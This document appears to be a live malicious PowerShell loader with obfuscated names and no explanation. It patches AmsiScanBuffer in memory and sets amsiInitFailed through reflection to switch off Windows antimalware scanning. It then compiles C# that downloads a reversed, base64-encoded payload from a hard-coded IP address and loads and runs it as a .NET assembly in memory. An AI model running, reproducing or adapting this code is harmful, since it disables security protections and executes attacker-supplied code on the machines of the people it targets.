function mosder
{
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $ZQCUW

$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
}
function grtzol
{
$xsvcode = @"
using System.Net;
using System.Reflection;
using System;
using System.Threading;
namespace Xeroch
{
    public class Catyl
    {
        public static string BoUaI12WaY(string s)
        {
            char[] array = new char[s.Length];
            int forward = 0;
            for (int i = s.Length - 1; i >= 0; i--)
            {
                array[forward++] = s[i];
            }
            return new string(array);
        }
    
        public void aRuna()
        {
            using (WebClient wc = new WebClient())
            {
               // new Thread(() =>
              //  {
                    try
                    {
                        Assembly assembly = AppDomain.CurrentDomain.Load(Convert.FromBase64String(BoUaI12WaY(wc.DownloadString("http://3.8.126.182/minom.txt"))));
                        MethodInfo methodInfo = assembly.EntryPoint;
                        object obj = assembly.CreateInstance(methodInfo.Name);
                        object[] parameters = new object[1];  // C#
                        if (methodInfo.GetParameters().Length == 0)
                        {
                            parameters = null; // VB.NET
                        }
                        methodInfo.Invoke(obj, parameters);
                    }
                    catch { return; }
              //  })
              //  { IsBackground = false }.Start();
            }
        }
    }
}
"@

Add-Type -TypeDefinition $xsvcode;
$cinstance = New-Object Xeroch.Catyl;
$cinstance.aRuna();

}
 
systeminfo; [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true); mosder; grtzol

